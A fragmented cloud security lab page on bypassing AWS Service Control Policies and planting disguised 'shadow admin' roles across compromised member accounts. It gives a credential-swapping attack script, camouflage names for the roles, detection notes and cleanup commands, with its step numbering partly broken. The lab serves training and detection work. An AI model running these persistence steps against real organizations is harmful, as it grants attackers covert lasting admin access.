Objective: Bypass Service Control Policies (SCPs) by leveraging management account access (or a delegated Organizations administrator) to modify or replace organizational policies.
MITRE ATT&CK: T1484.001 — Domain or Tenant Policy Modification: Group Policy Modification  |  T1098.001 — Account Manipulation: Additional Cloud Credentials
Scenario Prerequisite — SCP Management Requires Specific Permissions: SCP management requires either (a) management account credentials or (b) an account explicitly delegated for the organizations service administration itself. Delegated administrators for GuardDuty (guardduty.amazonaws.com) or Config (config.amazonaws.com) cannot modify SCPs — this is a common misconception. Those service delegations grant API access for their specific service only. In this lab scenario, the attacker has compromised the management account or obtained organizations:* permissions via a privilege escalation chain (e.g., via a misconfigured role in the management account discovered during the L01 role-chaining exercise).

Detection Notes
  • CloudTrail (management account): alert on organizations:UpdatePolicy, organizations:CreatePolicy, organizations:AttachPolicy, and organizations:DetachPolicy — these should be rare and change-managed
  • AWS Config: the org-policy-change managed rule can detect SCP modifications

  4. Re-attach any restrictive policies that were detached: aws organizations attach-policy --policy-id p-restrict02 --target-id 333333333333

MITRE ATT&CK: T1098.001 — Account Manipulation: Additional Cloud Credentials  |  T1136.003 — Create Account: Cloud Account  |  T1199 — Trusted Relationship
1
Script the role creation process to iterate across all compromised accounts. Crucially, unset the current session credentials at the start of each loop iteration before assuming the next role — failing to do this causes the previous account's credentials to bleed into the next iteration.
Terminal
$ cat plant-shadow-admin.sh
#!/bin/bash ATTACKER_ACCOUNT="999999999999" accounts=("111111111111" "222222222222" "333333333333" "444444444444") for account in "${accounts[@]}"; do echo "[*] Targeting account: $account" # Unset previous iteration's credentials before assuming next role unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN creds=$(aws sts assume-role \ --role-arn "arn:aws:iam::${account}:role/OrganizationAccountAccessRole" \ --role-session-name "audit-$(date +%s)" \ --query 'Credentials' --output json) export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId') export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey') export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.SessionToken') # Create shadow admin role (next steps) echo "[+] Assumed role in $account — planting shadow admin..." done
Why unset first: The unset call ensures each loop iteration starts with a clean credential state. Without it, if an assume-role call fails (e.g., throttle or missing permission), the shell retains the previous account's exported credentials and subsequent commands silently operate in the wrong account.
2

$ for account in 111111111111 222222222222 333333333333 444444444444; do unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN creds=$(aws sts assume-role \ --role-arn "arn:aws:iam::${account}:role/OrganizationAccountAccessRole" \ --role-session-name cleanup --query 'Credentials' --output json) export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId') export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey') export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.SessionToken') aws iam detach-role-policy \ --role-name AWSServiceAuditRole \ --policy-arn arn:aws:iam::aws:policy/AdministratorAccess aws iam delete-role --role-name AWSServiceAuditRole echo "[+] Cleaned up account $account" done
Shadow admin roles with names like AWSServiceAuditRole, AWSConfigRemediation, or CloudWatchSynthetics blend in with legitimate AWS service roles. Use tools like access-undenied or IAM Access Analyzer to detect roles with external trust to unknown accounts.
